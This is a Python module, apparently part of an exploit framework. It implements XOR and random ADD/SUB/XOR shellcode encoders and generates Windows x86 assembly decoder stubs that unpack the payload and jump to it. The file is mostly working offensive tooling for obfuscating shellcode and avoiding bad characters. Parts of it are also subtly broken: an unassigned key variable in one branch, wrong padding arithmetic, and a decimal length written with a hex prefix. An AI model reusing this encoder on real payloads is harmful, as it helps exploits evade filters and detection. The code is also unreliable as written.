from payloads.Engine import  Winx86Engine
from libs.Utilities import ShellcodeUtilities
from libs.Formats import Formats

import random
import codecs
import struct

class XorEncoder(Winx86Engine):

	def __init__(self, output="a"):
		super().__init__()

		self.info = {
		'Name':'xor',
		'Author':'Simone Cardona'
		}

		self.output = output

	def encrypt(self, var, key):
		encoded = ''
		l = []
		i = 0

		if len(var) % 4 != 0:
			var += b"\x90" * (len(var) % 4)

		while i < len(var):
			a = var[i:i+4]
			y = struct.unpack('I', a)[0] ^ struct.unpack('>I', key)[0]
			encoded += '0x%s,' % struct.pack(">I", y).hex()
			l.append(i)
			i += 4

		return  (encoded, len(l))

	def xorInit(self, badchar="", payload=False):

		formats1 = Formats("string0", output=self.output, payload=payload)
		value1 = formats1.handle()

		su = ShellcodeUtilities()

		res0 = su.badchars(badchar)
		su.no_collisions(value1, badchar)

		formats2 = Formats("string1", output=self.output, payload=payload)
		value2 = formats2.handle()

		badchars = su.getBadchars()

		if badchars == []:
			z = int("0xaaabacad",16)
		else:
			z = random.choice(badchars).replace("0x","")
			w = random.choice(badchars).replace("0x","")
			y = random.choice(badchars).replace("0x","")
			x = random.choice(badchars).replace("0x","")
			fourbytes = x+y+w+z
			fourbytes = codecs.decode(fourbytes, 'hex_codec')

		print("[!] Key: "+hex(struct.unpack('>I', fourbytes)[0]))

		value2 = value2.replace("\\x","")

		value2 = codecs.decode(value2, 'hex_codec')

		test = len(value2) % 4
		if test != 0:
			value2 += b"\x90" * (test)

		(xored, length) = self.encrypt(value2, fourbytes)
		self.xor(length, xored, fourbytes)

	def xor(self, length, shellcode, key):
		super().header()

		if length > 455:
			ecx = "ecx"
		elif length >= 255 and length <= 455:
			ecx = "cx"
		else:
			ecx = "cl"

		self.s0 += "pop esi\n"
		self.s0 += super().zeroingRegister(ecx) + "\n"
		self.s0 += "mov %s,0x%s\n" % (ecx, length)
		self.s0 += "mov edi, 0x%s\n" % key.hex()
		self.s0 += "decode:\n"
		self.s0 += "xor [esi], edi\n"
		self.s0 += "inc esi\n" * 4
		self.s0 += "loop decode\n"
		self.s0 += "jmp short Shellcode\n"

		self.s1 += 'Shellcode: dd %s' % shellcode
		super().mainFunction(start=0)
		super().assemble(self.output)


class RandomEncoder(Winx86Engine):

	def __init__(self, output="a"):
		super().__init__()

		self.info = {
		'Name':'random',
		'Description':'[XOR, ADD, SUB] encoder',
		'Author':'Simone Cardona'
		}

		self.output = output

	def encode(self):
		final = ''
		r = random.randrange(2,9)
		i = 0
		instr = ['ADD', 'SUB', 'XOR']

		for c in range(r):
			value = random.randrange(1,9)
			encode_i = random.choice(instr)
			if "XOR" in encode_i:
				if i != 1:
					final += "%s BYTE [esi], 0x0f\n" % (encode_i)
					i = 1
			else:
				final += "%s BYTE [esi], %s\n" % (encode_i, value)
		return final

	def decode(self,string):
		string = string.split('\n')
		string.pop()
		tmp = ''
		for s in reversed(string):
			if "ADD" in s:
				tmp1 = s[3:]
				tmp += "%s %s\n" % ("SUB", tmp1)

			if "XOR" in s:
				tmp += "%s\n" % s

			if "SUB" in s:
				tmp1 = s[3:]
				tmp += "%s %s\n" % ("ADD", tmp1)
		return tmp

	def randomInit(self, badchar="", payload=False):
		encoded = ''

		formats1 = Formats("string1", output=self.output, payload=payload)
		value1 = formats1.handle()

		value1 = value1.replace("\\x","")
		value1 = codecs.decode(value1, 'hex_codec')

		instructions = self.encode()
		instr0 = instructions

		instructions = instructions.split('\n')

		for x in bytearray(value1):
			y = x
			for line in instructions:
				if 'ADD' in line:
					y += int(line[-2:])
				if 'SUB' in line:
					y -= int(line[-2:])
				if 'XOR' in line:
					y = y ^ 0x0f

			encoded += '0x'
			encoded += '%02x,' % (y & 0xff)

		instr1 = self.decode(instr0)
		self.random(len(value1), instr1, encoded)

	def random(self, length, instructions, shellcode):
		super().header()

		if length > 455:
			ecx = "ecx"
		elif length >= 255 and length <= 455:
			ecx = "cx"
		else:
			ecx = "cl"

		self.s0 += "pop esi\n"
		self.s0 += super().zeroingRegister(ecx) + "\n"
		self.s0 += "mov %s,%s\n" % (ecx, length)
		self.s0 += "decode:\n"
		self.s0 += "%s\n" % instructions
		self.s0 += "inc esi\n"
		self.s0 += "loop decode\n"
		self.s0 += "jmp short Shellcode\n"

		self.s1 += "Shellcode: db %s" % shellcode
		super().mainFunction(start=0)
		super().assemble(self.output)